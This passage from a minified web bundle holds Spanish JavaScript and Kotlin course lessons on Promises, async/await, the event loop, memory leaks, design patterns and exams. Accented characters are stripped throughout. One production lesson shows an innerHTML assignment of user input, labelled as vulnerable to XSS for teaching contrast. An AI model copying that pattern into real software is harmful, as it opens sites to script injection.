2.  **Fulfilled / Resolved:** xito (se cumpli).
3.  **Rejected:** Fallo (se rompi la promesa).

## 2. Creando una Promesa

\`\`\`javascript
const miPromesa = new Promise((resolve, reject) => {
    const exito = true;
    
    setTimeout(() => {
        if (exito) {
            resolve("Todo sali bien!");
        } else {
            reject("Hubo un error :(");
        }
    }, 2000);
});
\`\`\`

## 3. Consumiendo una Promesa (\`.then\`, \`.catch\`)

\`\`\`javascript
miPromesa
    .then((mensaje) => {
        console.log("xito:", mensaje);
        return "Dato extra"; // Podemos encadenar otro .then
    })
    .then((extra) => {
        console.log("Cadena:", extra);
    })
    .catch((error) => {
        console.error("Error:", error);
    })
    .finally(() => {
        console.log("Termin (bien o mal)");
    });
\`\`\`

## 4. Ventajas sobre Callbacks
*   **Encadenamiento plano:** Adis pirmide.
*   **Manejo de errores centralizado:** Un solo \`.catch\` al final atrapa errores de cualquier paso anterior.

## 5. \`Promise.all\` y \`Promise.race\`

*   \`Promise.all([p1, p2])\`: Espera que **todas** se cumplan. Si una falla, todo falla. til para peticiones paralelas.
*   \`Promise.race([p1, p2])\`: Se queda con la que termine primero (sea xito o error).

## 6. Ejercicio
Convierte las 3 funciones del ejercicio anterior (\`paso1\`, \`paso2\`, \`paso3\`) para que devuelvan Promesas en lugar de recibir callbacks.
salas encadenadas con \`.then()\`.
`,completed:!1},{id:"js-ss-async-await",title:"Async / Await (Sintaxis dulce)",level:"semi-senior",content:`# Leccin 21: Async / Await (Sintaxis dulce)

## 1. Promesas disfrazadas

\`async/await\` (ES2017) no aade funcionalidad nueva al motor. ES azcar sintctico sobre Promesas. Hace que el cdigo asncrono se *lea* como sncrono.

## 2. Reglas
1.  **async:** Puesto antes de una funcin, asegura que siempre devuelva una Promesa.
2.  **await:** Puesto delante de una Promesa, **pausa** la ejecucin de la funcin hasta que la promesa se resuelva. Solo funciona dentro de funciones \`async\`.

## 3. Comparacin

**Con Promesas:**
\`\`\`javascript
function login() {
    getUser()
        .then(user => getRoles(user))
        .then(roles => console.log(roles))
        .catch(err => console.error(err));
}
\`\`\`

**Con Async/Await:**
\`\`\`javascript
async function login() {
    try {
        const user = await getUser(); // Pausa aqu, parece sncrono
        const roles = await getRoles(user);
        console.log(roles);
    } catch (err) {
        console.error(err); // Usamos try/catch estndar
    }
}
\`\`\`

## 4. El error comn: "Blocking" innecesario

Si tienes dos tareas independientes, no hagas esto:

\`\`\`javascript
// Malo (Secuencial innecesario)
const datos = await getDatos(); // Espera 2s
const usuarios = await getUsuarios(); // Espera 2s
// Total: 4s
\`\`\`

Mejor lanza las promesas juntas:
\`\`\`javascript
// Bueno (Paralelo)
const pDatos = getDatos();
const pUsuarios = getUsuarios();

const datos = await pDatos; // Espera
const usuarios = await pUsuarios; // Probablemente ya lleg
// Total: 2s (el mximo de las dos)
\`\`\`
O usa \`Promise.all\`.

## 5. Ejercicio
Reescribe tu ejercicio de encadenamiento de Promesas usando \`async/await\`.
Asegrate de envolverlo en un \`try/catch\` para manejar errores.
`,completed:!1},{id:"js-ss-error-handling",title:"Manejo de Errores (Defensive Programming)",level:"semi-senior",content:`# Leccin 22: Manejo de Errores (Defensive Programming)

## 1. El cdigo SIEMPRE falla

La red se cae, el usuario introduce datos invlidos, el servidor explota.
Un semi-senior asume el fallo. Un junior asume el xito.

## 2. Try / Catch / Finally

Bloques try-catch atrapan errores sncronos y errores en \`async/await\`.

\`\`\`javascript
try {
    const user = JSON.parse("Esto no es un JSON"); // Lanza error
} catch (error) {
    console.log("Ups, fall el parseo:", error.message);
    // Valor por defecto o reporte
} finally {
    console.log("Esto se ejecuta siempre (limpieza)");
}
\`\`\`

**Cuidado:** \`try/catch\` NO atrapa errores dentro de \`setTimeout\` o Promesas sin await.

\`\`\`javascript
try {
    setTimeout(() => { throw new Error("Boom"); }, 1000);
} catch (e) {
    // NO atrapa nada! El error ocurre en otro ciclo del Event Loop.
}
\`\`\`

## 3. Objetos de Error Personalizados

No lances solo strings (\`throw "Error"\`). Lanza objetos \`Error\`. Tienen Stack Trace (dnde ocurri).

\`\`\`javascript
class DatabaseError extends Error {
    constructor(msg) {
        super(msg);
        this.name = "DatabaseError";
    }
}

if (!db.conectada) {
    throw new DatabaseError("No hay conexin");
}
\`\`\`

## 4. Propagacin vs Manejo

Debo hacer catch aqu o dejarlo pasar?
*   Si puedes arreglar el problema (reintentar, usar valor default) -> **Catch**.
*   Si es crtico y debe detener el flujo para que un nivel superior se entere -> **No Catch (o re-throw)**.

## 5. Ejercicio
Crea una funcin \`dividir(a, b)\`.
1.  Si \`b\` es 0, lanza un error personalizado \`ZeroDivisionError\`.
2.  Si \`a\` o \`b\` no son nmeros, lanza \`TypeError\`.
3.  Usa un bloque try-catch que maneje cada tipo de error con un mensaje distinto.
`,completed:!1},{id:"js-ss-modules",title:"Modularizacin (ES Modules)",level:"semi-senior",content:`# Leccin 23: Modularizacin (ES Modules)

## 1. El fin del Script Spaghetti

Antes tenamos un archivo \`main.js\` de 5000 lneas. Imposible de mantener.
La modularizacin permite dividir el cdigo en archivos pequeos y reutilizables.

## 2. CommonJS (Node.js legacy) vs ES Modules (Estndar Web)

*   CommonJS: \`require()\` / \`module.exports\`.
*   ES Modules: \`import\` / \`export\`. (Nos enfocamos en este).

## 3. Exportar

### Named Export (Exportar con nombre)
Puedes tener varios por archivo.
\`\`\`javascript
// utils.js
export const pi = 3.14;
export function sumar(a, b) { return a + b; }
\`\`\`

### Default Export (Exportar por defecto)
Solo uno por archivo. Ideal para clases o componentes principales.
\`\`\`javascript
// User.js
export default class User { ... }
\`\`\`

## 4. Importar

\`\`\`javascript
// main.js
import { pi, sumar } from './utils.js'; // Named imports
import Usuario from './User.js'; // Default import (puedes cambiarle el nombre)
\`\`\`

## 5. Mdulos y \`<script>\`

En el navegador, para usar import/export, tu script debe tener \`type="module"\`.
\`<script type="module" src="main.js"><\/script>\`

Caractersticas:
*   Tienen \`defer\` automtico (no bloquean renderizado).
*   Tienen **Strict Mode** activado por defecto.
*   Su scope es el mdulo, no global.

## 6. Ejercicio
Simula una estructura de proyecto.
1.  \`math.js\`: Exporta funciones \`sumar\`, \`restar\`.
2.  \`logger.js\`: Exporta por defecto una funcin que haga \`console.log\` con fecha.
3.  \`app.js\`: Importa todo y salo.
*(Nota: En un entorno sin bundler como Vite/Webpack, necesitars un servidor local para que funcionen los modules).*
`,completed:!1},{id:"js-ss-prototypes",title:"Prototipos y Herencia Prototipal",level:"semi-senior",content:`# Leccin 24: Prototipos y Herencia Prototipal

En JS, casi todo es un objeto. Pero JS no usa clases tradicionales de "plano de construccin" como Java. Usa **Prototipos**.

## 1. El objeto [[Prototype]]
Cada objeto en JS tiene un enlace oculto a otro objeto llamado su prototipo. Si buscas una propiedad en un objeto y no est, JS la busca en su prototipo.

\`\`\`javascript
const animal = { come: true };
const conejo = { salta: true };

conejo.__proto__ = animal; // Establecemos el prototipo (Herencia)

console.log(conejo.salta); // true
console.log(conejo.come);  // true (Viene del prototipo!)
\`\`\`

## 2. La Cadena de Prototipos
Esto puede seguir hacia arriba: \`conejo -> animal -> Object.prototype -> null\`.

## 3. Function.prototype
Cuando creas una funcin, ella tiene una propiedad \`prototype\`. Esto es lo que se asigna como \`__proto__\` a los objetos creados con \`new\`.

## 4. Clases vs Prototipos
Las clases de ES6 son "azcar sintctico". Por debajo, siguen funcionando con prototipos.

## 5. Ejercicio
Aade un mtodo \`presentarse()\` al prototipo de \`String\` para que cualquier texto pueda decir: \`"Hola, soy el string: [Texto]"\`.
\`\`\`javascript
String.prototype.presentarse = function() { ... }
\`\`\`
`,completed:!1},{id:"js-ss-eval",title:"Evaluacin Final: Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: JavaScript Semi-Senior

Demuestra tu comprensin profunda del lenguaje: Scope, Asincrona y Manejo de Datos.

## Seccin 1: Teora Avanzada (Responde con cdigo)

1.  **Dibuja o explica la Cadena de Scope:** Si \`a\` no est en una funcin, dnde la busca JS?
2.  **Closures:** Escribe una funcin \`crearContador(n)\` que devuelva un contador que empiece en \`n\` y sume 1 cada vez que se llame.
3.  **This:** Qu valor tiene \`this\` dentro de una Arrow Function si se usa como mtodo de un objeto?
4.  **Promesas:** Qu diferencia hay entre \`Promise.all\` y \`Promise.race\`?
5.  **Qu es el "Hoisting" y cmo afecta a las declaraciones de funcin vs variables?**

## Seccin 2: Prctica - "El Buscador de Usuarios" (Fetch + Async/Await)

Crea una funcin asncrona \`buscarUsuario(id)\` que consuma la API: \`https://jsonplaceholder.typicode.com/users/{id}\`.

**Requisitos:**
1.  Usa \`async/await\` y bloques \`try/catch\`.
2.  Si la peticin es exitosa, devuelve un objeto *limpio*: \`{ nombre: user.name, email: user.email }\`.
3.  Si la API devuelve error 404 (usuario no encontrado), lanza un error personalizado: \`"Usuario no existe"\`.
4.  Si hay error de red, lanza: \`"Error de conexin"\`.

## Seccin 3: Callback Hell Refactor

Convierte este cdigo (ficticio) callback-based a Async/Await:

\`\`\`javascript
// ANTES
getUser(1, (user) => {
    getPosts(user.id, (posts) => {
        getComments(posts[0].id, (comments) => {
            console.log(comments);
        });
    });
});

// DESPUS (Tu respuesta aqu)
\`\`\`

## Criterios de Aprobacin

*   [ ] Correcto uso de \`async/await\` y \`try/catch\`.
*   [ ] Explicacin clara del contexto de \`this\` en Arrows.
*   [ ] Entendimiento slido de Closures.
*   [ ] Manejo correcto de errores asncronos.
`,completed:!1,isProject:!0},{id:"js-senior-event-loop",title:"Event Loop en Profundidad (El Corazn de JS)",level:"senior",content:`# Leccin 24: Event Loop en Profundidad (El Corazn de JS)

## 1. Mitos y Realidades

**Mito:** "JavaScript es lento porque es single-threaded".
**Realidad:** JS delega las tareas pesadas (I/O, Timers) al entorno (Browser/Node) y gestiona la orquestacin de manera extremadamente eficiente mediante el Event Loop.

## 2. La Arquitectura

JS tiene un **Call Stack** (Pila de llamadas) donde ejecuta el cdigo sncrono. Cuando se vaca, entra en juego el Event Loop.

### Componentes Clave:
1.  **Call Stack:** LIFO (Last In, First Out). Tu cdigo sncrono.
2.  **Web APIs (Browser) / C++ APIs (Node):** Donde ocurren \`setTimeout\`, \`fetch\`, DOM events.
3.  **Task Queue (Macrotasks):** \`setTimeout\`, \`setInterval\`, I/O.
4.  **Microtask Queue:** \`Promise.then\`, \`queueMicrotask\`, \`MutationObserver\`.

## 3. Microtasks vs Macrotasks (La gran diferencia)

**El Event Loop tiene preferencia VIP por las Microtasks.**
Despus de cada tarea del Call Stack, el Event Loop revisa la Microtask Queue y la vaca **COMPLETAMENTE** antes de pasar a la siguiente Macrotask o renderizar.

\`\`\`javascript
console.log('1. Start');

setTimeout(() => {
    console.log('2. Timeout (Macrotask)');
}, 0);

Promise.resolve().then(() => {
    console.log('3. Promise (Microtask)');
})
.then(() => {
    console.log('4. Promise encadenada (Microtask)');
});

console.log('5. End');

// Orden Real: 1, 5, 3, 4, 2
\`\`\`
*Si creas un bucle infinito de Microtasks, bloquears el navegador igual que con un \`while(true)\`.*

## 4. Renderizado (Rendering Pipeline)

El navegador intenta renderizar a 60fps (cada 16.6ms).
El renderizado ocurre **despus** de vaciar las Microtasks y **antes** de la siguiente Macrotask (a veces).

\`Call Stack -> Microtasks -> Render -> Macrotask\`

## 5. Pregunta de Entrevista Senior

**Pregunta:** Cmo haras para ejecutar una funcin compleja sin bloquear la UI (Main Thread)?
**Respuesta:** "Chunking" o "Task Splitting". Dividir el trabajo en trozos pequeos y usar \`setTimeout\` (Macrotask) o \`requestIdleCallback\` para ceder el control al navegador entre trozos y permitir que renderice.

\`\`\`javascript
function procesarGigante(datos) {
    if (datos.length === 0) return;
    
    // Procesar primeros 1000
    hacerAlgo(datos.slice(0, 1000));
    
    // Encolar el resto para despus del render
    setTimeout(() => {
        procesarGigante(datos.slice(1000));
    }, 0);
}
\`\`\`
`,completed:!1},{id:"js-senior-gestion-memoria",title:"Gestin de Memoria y Garbage Collection",level:"senior",content:`# Leccin 25: Gestin de Memoria y Garbage Collection

## 1. El Ciclo de Vida de la Memoria

1.  **Allocation:** Reservar memoria (crear variables).
2.  **Usage:** Leer/Escribir data.
3.  **Release:** Liberar memoria cuando ya no se necesita.

En C++ lo haces t (\`malloc\`/\`free\`). En JS es automtico (GC).

## 2. Garbage Collection (Mark & Sweep)

El algoritmo principal de V8 es **Mark & Sweep**.
1.  **Roots:** El GC empieza desde las races (Global Object, Stack actual).
2.  **Mark:** Recorre todas las referencias y marca los objetos "alcanzables" (Reachable).
3.  **Sweep:** Los objetos NO marcados (inalcanzables) son eliminados y la memoria devuelta al SO.

## 3. Memory Leaks (Fugas de Memoria)

Ocurren cuando mantienes una referencia a un objeto que ya no necesitas, impidiendo que el GC lo limpie.

### Causas Comunes:
1.  **Variables Globales Accidentales:**
    \`\`\`javascript
    function leak() {
        cosa = "Gigante"; // Sin let/const, se pega a window.cosa
    }
    \`\`\`
2.  **Closures Olvidados:** retienen el scope padre entero.
3.  **Event Listeners:**
    Si aades un listener a un elemento DOM y luego borras el elemento del DOM pero NO quitas el listener, el elemento sigue en memoria (Detached DOM node).
4.  **Timers:** \`setInterval\` que nunca se limpia.

## 4. WeakMap y WeakSet (Herramientas Senior)

Son estructuras donde las referencias a las llaves son **dbiles**. Si no hay otra referencia al objeto llave, el GC puede eliminarlo de la WeakMap automticamente.

**Caso de Uso:** Asociar metadata a objetos DOM.

\`\`\`javascript
let boton = document.getElementById('btn');
const metaData = new WeakMap();

metaData.set(boton, { clicks: 0 });

// Si 'boton' es eliminado del DOM y mi variable 'boton' se limpia:
boton = null; 

// La entrada en WeakMap desaparece sola. 
// Con un Map normal, se hubiera quedado ah para siempre (Leak).
\`\`\`

## 5. Desafo de Produccin
Ests codeando una SPA (Single Page App). Los usuarios se quejan de que tras 1 hora de uso, la app va lenta y el navegador consume 2GB de RAM.
*   Qu herramienta usas? -> Chrome DevTools > Memory Tab.
*   Qu buscas? -> Heap Snapshot y Allocation Timeline.
*   Qu sospechas? -> Componentes desmontados que no limpiaron sus suscripciones o listeners.
`,completed:!1},{id:"js-senior-arquitectura-async",title:"Arquitectura Asncrona Avanzada",level:"senior",content:`# Leccin 26: Arquitectura Asncrona Avanzada

## 1. Ms all de Async/Await

Async/Await es genial, pero para flujos de datos complejos (streams, sockets, archivos grandes), se queda corto.

## 2. Generadores (\`function*\`)

Funciones que pueden "pausarse" (\`yield\`) y reanudarse.
Son la base de libreras como Redux-Saga.

\`\`\`javascript
function* idGenerator() {
    let id = 1;
    while(true) {
        yield id++; // Pausa y devuelve el valor
    }
}

const gen = idGenerator();
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
\`\`\`

## 3. Async Iterators (\`for await...of\`)

Combina generadores con promesas. Perfecto para leer streams de datos chunk por chunk.

\`\`\`javascript
async function* fetchDatosPaginados(url) {
    let nextUrl = url;
    while(nextUrl) {
        const response = await fetch(nextUrl);
        const data = await response.json();
        nextUrl = data.nextPage;
        yield data.results; // Emite una pgina de resultados
    }
}

// Uso
async function consumir() {
    for await (const pagina of fetchDatosPaginados('/api/users')) {
        renderizar(pagina); // Renderiza pgina a pgina segn llegan
    }
}
\`\`\`

## 4. Race Conditions (Condiciones de Carrera)

Dos peticiones asncronas compiten. La ltima en llegar debera ganar, pero a veces la primera llega ltima y sobrescribe el estado incorrectamente.

**Solucin Senior:** AbortController.

\`\`\`javascript
let controller;

async function buscar(query) {
    if (controller) controller.abort(); // Cancela la peticin anterior
    controller = new AbortController();

    try {
        const res = await fetch(\`/api?q=\${query}\`, { signal: controller.signal });
        const data = await res.json();
        mostrar(data);
    } catch (err) {
        if (err.name === 'AbortError') console.log('Bsqueda cancelada');
    }
}
\`\`\`

## 5. Patrn Retry con Backoff Exponencial

Si una API falla, no reintentes inmediatamente (DDoS a tu propio server).
Espera 1s, luego 2s, luego 4s...

\`\`\`javascript
async function fetchWithRetry(url, retries = 3, delay = 1000) {
    try {
        return await fetch(url);
    } catch (err) {
        if (retries === 0) throw err;
        await new Promise(r => setTimeout(r, delay));
        return fetchWithRetry(url, retries - 1, delay * 2);
    }
}
\`\`\`
`,completed:!1},{id:"js-senior-patrones-avanzados",title:"Patrones de Diseo Avanzados",level:"senior",content:`# Leccin 27: Patrones de Diseo Avanzados

## 1. Por qu patrones?

Para resolver problemas recurrentes de arquitectura. Un Senior no reinventa la rueda.

## 2. Singleton (Instancia nica)

Asegurar que una clase tenga solo una instancia global (ej. Conexin a DB, Estado Global).

\`\`\`javascript
class Config {
    constructor() {
        if (Config.instance) return Config.instance;
        this.settings = {};
        Config.instance = this;
    }
}
// En mdulos ES6, exportar una instancia const funciona como Singleton automtico.
// export default new Config();
\`\`\`

## 3. Observer / Pub-Sub

Desacoplar componentes. Uno emite eventos, otros escuchan.

\`\`\`javascript
class EventEmitter {
    constructor() {
        this.events = {};
    }
    on(event, listener) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push(listener);
    }
    emit(event, data) {
        if (this.events[event]) {
            this.events[event].forEach(fn => fn(data));
        }
    }
}
\`\`\`

## 4. Factory Function (vs Constructores)

Prefiere Factories para evitar problemas con \`this\` y favorecer composicin.

\`\`\`javascript
// Class (Herencia rgida)
class Dog extends Animal { ... }

// Factory (Composicin flexible)
const createDog = () => {
    const dog = { ...createAnimal() };
    return {
        ...dog,
        ...canBark(dog),
        ...canWagTail(dog)
    };
};
\`\`\`

## 5. Module Pattern (Revelador)

La base de todo el JS moderno. Encapsular privado, revelar pblico.

\`\`\`javascript
const BankAccount = (() => {
    let balance = 0; // Privado

    function changeBal(val) { // Privado
        balance += val;
    }

    return {
        deposit: (val) => changeBal(val),
        withdraw: (val) => changeBal(-val),
        value: () => balance
    };
})();
\`\`\`

## 6. Composition over Inheritance

**Mantra Senior.** La herencia (\`extends\`) crea acoplamientos fuertes y frgiles ("Gorilla-Banana Problem": pides una banana y te traes al gorila y a toda la selva).
La composicin construye objetos combinando capacidades pequeas.
`,completed:!1},{id:"js-senior-js-produccion",title:"JavaScript en Produccin",level:"senior",content:`# Leccin 28: JavaScript en Produccin

## 1. El cdigo no termina en localhost

Un Senior piensa en Build, Deploy, Performance y Seguridad.

## 2. Bundling y Tree Shaking

Herramientas (Webpack, Vite, Rollup) empaquetan tu cdigo.
**Tree Shaking:** Eliminacin de cdigo muerto.
Si importas \`import { a } from 'libreria-gigante'\`, solo \`a\` debera ir al bundle final. Esto requiere usar ES Modules (\`import/export\`), no CommonJS.

## 3. Polyfills y Transpilacin (Babel)

Tu cdigo debe correr en iOS 12? En Chrome 50?
*   **Transpilar:** Convertir sintaxis nueva (\`=>\`) a vieja (\`function\`).
*   **Polyfill:** Aadir funcionalidad que no existe (\`Promise\`, \`Array.includes\`).

**Estrategia Senior:** \`<script type="module">\` sirve cdigo moderno a navegadores modernos (90% trfico) y carga menos KB. Usa \`nomodule\` para servir legacy bundle a browsers viejos.

## 4. Seguridad: XSS (Cross Site Scripting)

El ataque #1 en Frontend. Inyectar scripts maliciosos.

**Vulnerable:**
\`div.innerHTML = userInput;\`

**Seguro:**
\`div.innerText = userInput;\`

Si usas React/Vue, ellos escapan por defecto. Pero cuidado con \`dangerouslySetInnerHTML\`.

## 5. Performance Metrics (Web Vitals)

*   **LCP (Largest Contentful Paint):** Carga visual.
*   **FID (First Input Delay):** Interactividad.
*   **CLS (Cumulative Layout Shift):** Estabilidad visual (cosas que saltan).

Un Senior optimiza estas mtricas.

## 6. Error Boundaries y Monitoring

No dejes que tu app explote en blanco. Captura errores globales.
Usa servicios como Sentry o LogRocket para recibir alertas cuando un usuario tiene un crash en produccin.

\`\`\`javascript
window.addEventListener('error', (event) => {
    Sentry.captureException(event.error);
});
\`\`\`
`,completed:!1},{id:"js-senior-errores-criticos",title:"Errores Crticos Reales (Case Studies)",level:"senior",content:`# Leccin 29: Errores Crticos Reales (Case Studies)

## Caso 1: El JSON Infinito

**Problema:** Una app crashea el navegador al intentar guardar el estado.
**Cdigo:** \`JSON.stringify(state)\`
**Causa:** Estructura Circular. El objeto A apunta a B, y B apunta a A. \`JSON.stringify\` entra en bucle infinito.
**Solucin Senior:** Usar un replacer function en stringify o libreras como \`flatted\`.

## Caso 2: El Zombie Listener

**Problema:** SPA de chat. Al navegar entre salas, los mensajes llegan duplicados, luego triplicados.
**Causa:**
\`\`\`javascript
useEffect(() => {
    socket.on('message', handleMessage);
    // Falta el cleanup!
}, []);
\`\`\`
Cada vez que el componente se monta, aade un NUEVO listener sin quitar el viejo.
**Solucin:** Devolver la funcin de limpieza (\`off\` o \`removeListener\`).

## Caso 3: El \`await\` dentro del \`forEach\`

**Problema:** Queremos guardar 5 usuarios en base de datos secuencialmente.
\`\`\`javascript
users.forEach(async (user) => {
    await saveUser(user);
});
console.log('Done');
\`\`\`
**Resultado:** Imprime "Done" INMEDIATAMENTE. Las promesas se disparan pero el forEach no las espera.
**Solucin:** Usar \`for...of\` con await, o \`Promise.all\` con map.

## Caso 4: Mutacin de Props/Estado

**Problema:** Un objeto cambia en un lugar y rompe algo totalmente no relacionado en otra parte de la UI.
**Causa:** Pasar objetos por referencia y mutarlos directamente (\`obj.prop = 1\`), rompiendo el principio de inmutabilidad (especialmente crtico en React/Redux).
**Solucin:** \`const newState = { ...oldState, prop: 1 };\` o \`Immer\`.

## Desafo Final: El Debounce Fallido

Implementa una funcin \`debounce\` robusta.
Si el usuario escribe en un buscador, solo dispara la bsqueda 500ms despus de que deje de escribir.
Si dispara una nueva tecla, cancela el timer anterior.
Esta es la prueba de fuego de closures, timers y this.
`,completed:!1},{id:"js-senior-weaving-metaprogramming",title:"Metaprogramacin: Proxies y Reflection",level:"senior",content:`# Leccin 30: Metaprogramacin: Proxies y Reflection

Un Senior no solo escribe cdigo, crea herramientas que escuchan al propio cdigo.

## 1. Proxies
Un Proxy te permite interceptar y personalizar operaciones fundamentales sobre objetos (lectura, escritura, borrado).

\`\`\`javascript
const target = { mensaje: "Hola" };
const handler = {
    get: (obj, prop) => {
        return prop in obj ? obj[prop] : "Propiedad no existe";
    }
};

const proxy = new Proxy(target, handler);
console.log(proxy.mensaje); // "Hola"
console.log(proxy.loquesea); // "Propiedad no existe"
\`\`\`
*Uso real:* Reactividad en Vue 3, validacin de esquemas, logging automtico.

## 2. Reflect
Es un objeto global que proporciona mtodos para interceptar operaciones de JavaScript de forma limpia, sin usar operadores como \`in\` o \`delete\`.

## 3. Web Workers: Paralelismo Real
JS es single-threaded, pero los Web Workers permiten correr cdigo en hilos de fondo.

\`\`\`javascript
// main.js
const worker = new Worker('worker.js');
worker.postMessage([1000, 2000]); // Enva data pesada

// worker.js
onmessage = (e) => {
    const result = procesarGigante(e.data);
    postMessage(result); // Devuelve resultado
};
\`\`\`

## 4. Ejercicio
Crea un Proxy para un objeto \`Perfil\`. El proxy debe impedir que se asigne una edad menor a 0 o mayor a 120.
`,completed:!1},{id:"js-senior-functional-patterns",title:"Programacin Funcional Avanzada",level:"senior",content:`# Leccin 31: Programacin Funcional Avanzada

A nivel Senior, dejas de pensar en "instrucciones" y empiezas a pensar en "transformaciones de datos".

## 1. Pureza e Inmutabilidad
*   **Funciones Puras:** Mismo input -> Mismo output. Sin efectos secundarios. Son fciles de testear y cachear.
*   **Inmutabilidad:** No cambias el objeto original, creas uno nuevo.

## 2. Currying y Aridad
La Aridad es el nmero de argumentos de una funcin. Currying es convertir una funcin de varios argumentos en una serie de funciones de un solo argumento.

\`\`\`javascript
const suma = a => b => a + b;
const sumar5 = suma(5);
console.log(sumar5(10)); // 15
\`\`\`

## 3. Composicin (Pipe y Compose)
Construir lgica compleja uniendo funciones pequeas.

\`\`\`javascript
const aMayusculas = str => str.toUpperCase();
const exclamar = str => \`\${str}!!\`;
const repetir = str => \`\${str} \${str}\`;

// Sin composicin: repetir(exclamar(aMayusculas("hola")))
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);

const gritarYRepetir = pipe(aMayusculas, exclamar, repetir);
console.log(gritarYRepetir("javascript")); // "JAVASCRIPT!! JAVASCRIPT!!"
\`\`\`

## 4. Higher Order Functions Avanzadas
Conceptos de **Monads** o **Functors** (opcional pero bueno saberlo): envolver un valor en un contexto para operarlo de forma segura.

## 5. Ejercicio
Implementa una funcin \`compose\` (que funcione de derecha a izquierda, al revs que pipe) y sala para encadenar 3 transformaciones de texto.
`,completed:!1},{id:"js-senior-eval",title:"Evaluacin Final: Senior",level:"senior",content:`# Evaluacin Final: JavaScript Senior

Esta evaluacin mide tu capacidad para resolver problemas complejos de arquitectura, performance y diseo de software.

## Seccin 1: Preguntas de Arquitectura (Nivel Experto)

1.  **Explica en detalle cmo funciona el Event Loop:** Cul es la diferencia CRUCIAL entre una Macrotarea (setTimeout) y una Microtarea (Promise) en cuanto a priorizacin y renderizado?
2.  **Describe el proceso de Garbage Collection (Mark-and-Sweep) y menciona 3 formas comunes de causar Memory Leaks en JS moderno.**
3.  **Diseo de APIs:** Cules son las ventajas del patrn Module (Revealing Module) frente a clases tradicionales para la encapsulacin?
4.  **Si una funcin asncrona bloquea el Single Thread por 5 segundos, qu pasa con el usuario?** Cmo resolveras este bloqueo (Task Splitting / Web Workers)?

## Seccin 2: Desafo de Performance - "El Debouncer"

Escribe una funcin \`debounce(fn, wait)\` desde cero.
Esta funcin debe recibir otra funcin (\`fn\`) y un tiempo (\`wait\`) en milisegundos.
Debe devolver una NUEVA funcin que, cuando se ejecute repetidamente (ej: evento \`scroll\` o \`input\`), SOLO llame a \`fn\` UNA VEZ despus de que el usuario deje de interactuar por \`wait\` ms.

**Requisitos:**
1.  Debe usar closures para guardar el temporizador.
2.  Debe usar \`apply\` o \`call\` para preservar el contexto (\`this\`) y los argumentos.
3.  Debe poder cancelar la ejecucin previa si se invoca de nuevo antes del tiempo.

## Seccin 3: Memory Leak Debugging (Terico)

**Escenario:**
Tienes una SPA (Single Page App). Al navegar repetidamente entre la Home y el Dashboard, la memoria RAM usada por la pestaa de Chrome sube de 100MB a 1GB en 10 minutos.

**Pregunta:**
Describe paso a paso cmo usaras Chrome DevTools para identificar la causa raz.
Qu herramienta usas? (Memory Tab, Performance Monitor).
Cmo confirmas si es un componente de React/Vue desmontado que dej basura?

## Criterios de Aprobacin

*   [ ] Explicacin precisa y tcnica del Event Loop (Micro vs Macro).
*   [ ] Implementacin correcta de \`debounce\` manejando \`this\` y argumentos.
*   [ ] Conocimiento profundo de herramientas de perfilado (Profiling).
*   [ ] Solucin arquitectnica para evitar bloqueos del Main Thread.
`,completed:!1,isProject:!0}]},uD={id:"kotlin",title:"Kotlin Moderno",description:"El lenguaje oficial de Android y el futuro del Backend en la JVM. Conciso, seguro y potente.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"kotlin-01-intro-kotlin",title:"Kotlin - El hijo prdigo de la JVM",level:"junior",content:`# Leccin 01: Kotlin - El hijo prdigo de la JVM

**Kotlin** es lo que Java debi haber sido desde el principio. Es moderno, conciso y 100% interoperable con Java. Google lo declar el lenguaje oficial de Android en 2017.

## 1. Kotlin vs Java
*   **Concisin:** Menos cdigo repetitivo (Boilerplate). No ms \`public static void main\`, ni getter/setters manuales.
*   **Null Safety:** El compilador te obliga a manejar los nulos. Adis \`NullPointerException\`.
*   **Interoperabilidad:** Puedes llamar cdigo Java desde Kotlin y viceversa.

## 2. Variables (\`val\` vs \`var\`)
En Kotlin preferimos la inmutabilidad.
*   \`val\`: Valor inmutable (como \`const\` en JS o \`final\` en Java). **sala por defecto.**
*   \`var\`: Variable mutable.

\`\`\`kotlin
val nombre = "Octavio" // Tipo inferido (String)
var edad = 30
edad = 31 // OK
// nombre = "Pedro" // ERROR de compilacin
\`\`\`

## 3. Tipos de Datos
Kotlin es esttico, pero inteligente (Preferencia de tipos).
\`\`\`kotlin
val numero: Int = 10
val precio: Double = 99.99
val esKotlinGenial: Boolean = true
\`\`\`

---

### Misin Junior:
Acostmbrate a usar \`val\`. Si una variable no necesita cambiar, no debera poder cambiar. Esto elimina toda una categora de bugs.
`,completed:!1},{id:"kotlin-02-funciones-control",title:"Funciones y Control de Flujo (El adis a Java verbose)",level:"junior",content:`# Leccin 02: Funciones y Control de Flujo (El adis a Java verbose)

En Kotlin, las funciones son ciudadanos de primera clase. Y el \`if\` es una expresin.

## 1. Funciones (\`fun\`)
\`\`\`kotlin
fun sumar(a: Int, b: Int): Int {
    return a + b
}

// Forma exprs (Single-expression function, el compilador infiere el tipo)
fun restar(a: Int, b: Int) = a - b
\`\`\`

## 2. Argumentos por defecto y nombrados
\`\`\`kotlin
fun saludar(mensaje: String = "Hola", nombre: String) {
    println("$mensaje $nombre")
}

// Llamada con argumento nombrado
saludar(nombre = "Octavio") // Imprime: Hola Octavio
saludar(mensaje = "Chau", nombre = "Pedro")
\`\`\`

## 3. Control de Flujo
*   \`if\`: Puede devolver un valor.
\`\`\`kotlin
val mayor = if (a > b) a else b // Equivalente al ternario (a > b ? a : b)
\`\`\`

*   \`when\`: El nuevo y poderoso \`switch\`.
\`\`\`kotlin
val x = 1
when (x) {
    1 -> print("Es uno")
    2 -> print("Es dos")
    else -> print("Es otro")
}
\`\`\`

*   \`for\`:
\`\`\`kotlin
for (i in 1..5) println(i) // Rangos (1, 2, 3, 4, 5)
for (i in 10 downTo 0 step 2) println(i)
\`\`\`

---

### Misin Junior:
Kotlin elimina la necesidad de Sobrecarga de Mtodos (Overloading) gracias a los argumentos por defecto. Aprovchalo!
